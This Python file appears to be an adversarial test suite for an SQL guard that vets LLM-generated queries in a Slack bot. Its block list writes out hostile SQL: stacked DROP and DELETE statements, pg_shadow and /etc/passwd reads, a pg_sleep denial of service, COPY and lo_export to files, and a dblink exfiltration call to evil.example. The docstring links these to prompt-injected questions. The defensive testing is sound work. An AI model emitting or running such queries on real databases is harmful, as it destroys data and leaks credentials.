"""
Adversarial test suite for the SQL guard.

Every case here is something an LLM has actually been talked into emitting,
or something a prompt-injected question could produce. Run it before
trusting the bot in a live workspace:

    python -m slackbot.test_sql_guard
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from slackbot.sql_guard import SQLGuard, strip_markdown_fences   # noqa: E402

SHOULD_ALLOW = [
    ("plain count",
     "SELECT COUNT(*) FROM analytics.fact_registration"),
    ("group by with join",
     """SELECT c.state, COUNT(*) AS n
        FROM analytics.fact_registration f
        JOIN analytics.dim_college c ON c.college_key = f.college_key
        GROUP BY c.state ORDER BY n DESC"""),
    ("CTE",
     """WITH daily AS (
            SELECT date_key, COUNT(*) n FROM analytics.fact_registration
            GROUP BY date_key)
        SELECT * FROM daily ORDER BY n DESC"""),
    ("a view",
     "SELECT * FROM analytics.v_pipeline_health"),
    ("union of two allowed tables",
     """SELECT track_name FROM analytics.dim_track
        UNION SELECT team_name FROM analytics.dim_team"""),
    ("window function",
     """SELECT date_key, COUNT(*) OVER (ORDER BY date_key) AS running
        FROM analytics.fact_registration"""),
    ("existing small limit is kept",
     "SELECT * FROM analytics.dim_team LIMIT 5"),
    ("unqualified allowed table (search_path is analytics)",
     "SELECT COUNT(*) FROM fact_registration"),
    ("subquery",
     """SELECT * FROM analytics.dim_team
        WHERE team_key IN (SELECT team_key FROM analytics.fact_score)"""),
    ("case expression",
     """SELECT CASE WHEN year_of_study <= 2 THEN 'junior' ELSE 'senior' END AS cohort,
               COUNT(*) FROM analytics.dim_participant GROUP BY 1"""),
]

SHOULD_BLOCK = [
    ("plain delete",           "DELETE FROM analytics.fact_registration"),
    ("drop table",             "DROP TABLE analytics.fact_registration"),
    ("truncate",               "TRUNCATE analytics.fact_score"),
    ("update",                 "UPDATE analytics.dim_team SET status='x'"),
    ("insert",                 "INSERT INTO analytics.dim_team (team_id) VALUES (1)"),
    ("stacked statement",
     "SELECT 1 FROM analytics.dim_team; DROP TABLE analytics.dim_team"),
    ("stacked with comment",
     "SELECT 1 FROM analytics.dim_team; -- ok\nDELETE FROM analytics.dim_team"),
    ("mixed case evasion",     "DeLeTe FROM analytics.fact_score"),
    ("select into",
     "SELECT * INTO new_tbl FROM analytics.dim_team"),
    ("create table as",
     "CREATE TABLE x AS SELECT * FROM analytics.dim_team"),
    ("ops schema",             "SELECT * FROM ops.participant"),
    ("ops schema via join",
     """SELECT * FROM analytics.dim_team t
        JOIN ops.participant p ON TRUE"""),
    ("pg_catalog",             "SELECT * FROM pg_catalog.pg_user"),
    ("information_schema",     "SELECT * FROM information_schema.tables"),
    ("pg_shadow password dump","SELECT * FROM pg_shadow"),
    ("pg_read_file",           "SELECT pg_read_file('/etc/passwd')"),
    ("pg_sleep DoS",           "SELECT pg_sleep(600) FROM analytics.dim_team"),
    ("dblink exfiltration",
     "SELECT * FROM dblink('host=evil.example','SELECT 1') AS t(x int)"),
    ("lo_export",              "SELECT lo_export(1, '/tmp/out')"),
    ("set_config",             "SELECT set_config('x','y',false)"),
    ("grant",                  "GRANT ALL ON analytics.dim_team TO PUBLIC"),
    ("unknown table",          "SELECT * FROM secret_salaries"),
    ("cross-database",         "SELECT * FROM otherdb.analytics.dim_team"),
    ("copy command",           "COPY analytics.dim_team TO '/tmp/x.csv'"),
    ("empty",                  "   "),
    ("transaction control",    "BEGIN; SELECT 1 FROM analytics.dim_team; COMMIT"),
    ("public schema",          "SELECT * FROM public.something"),
]


def main() -> int:
    guard = SQLGuard()
    failures = []

    print("=" * 72)
    print("  SQL GUARD -- ADVERSARIAL TEST SUITE")
    print("=" * 72)

    print(f"\n  SHOULD ALLOW ({len(SHOULD_ALLOW)})")
    for label, sql in SHOULD_ALLOW:
        v = guard.check(sql)
        ok = v.allowed
        print(f"    {'PASS' if ok else 'FAIL'}  {label}")
        if not ok:
            print(f"          -> refused: {v.reason}")
            failures.append(("allow", label, v.reason))

    print(f"\n  SHOULD BLOCK ({len(SHOULD_BLOCK)})")
    for label, sql in SHOULD_BLOCK:
        v = guard.check(sql)
        ok = not v.allowed
        print(f"    {'PASS' if ok else 'FAIL'}  {label}")
        if not ok:
            print(f"          -> WAS ALLOWED: {v.sql[:90]}")
            failures.append(("block", label, v.sql))

    # LIMIT behaviour
    print("\n  LIMIT HANDLING")
    cases = [
        ("no limit -> default 100",
         "SELECT * FROM analytics.dim_team", 100),
        ("small limit kept",
         "SELECT * FROM analytics.dim_team LIMIT 5", 5),
        ("oversized limit capped",
         "SELECT * FROM analytics.dim_team LIMIT 99999", 500),
    ]
    for label, sql, expected in cases:
        v = guard.check(sql)
        ok = v.allowed and v.limit_applied == expected
        print(f"    {'PASS' if ok else 'FAIL'}  {label} "
              f"(got {v.limit_applied})")
        if not ok:
            failures.append(("limit", label, str(v.limit_applied)))

    # Fence stripping
    print("\n  FENCE STRIPPING")
    fenced = "```sql\nSELECT 1 FROM analytics.dim_team\n```"
    stripped = strip_markdown_fences(fenced)
    ok = stripped == "SELECT 1 FROM analytics.dim_team"
    print(f"    {'PASS' if ok else 'FAIL'}  ```sql fence removed")
    if not ok:
        failures.append(("fence", "strip", stripped))

    total = len(SHOULD_ALLOW) + len(SHOULD_BLOCK) + len(cases) + 1
    print("\n" + "=" * 72)
    if failures:
        print(f"  {len(failures)} FAILURE(S) of {total} checks")
        for kind, label, detail in failures:
            print(f"    [{kind}] {label}: {detail}")
        return 1
    print(f"  ALL {total} CHECKS PASSED")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
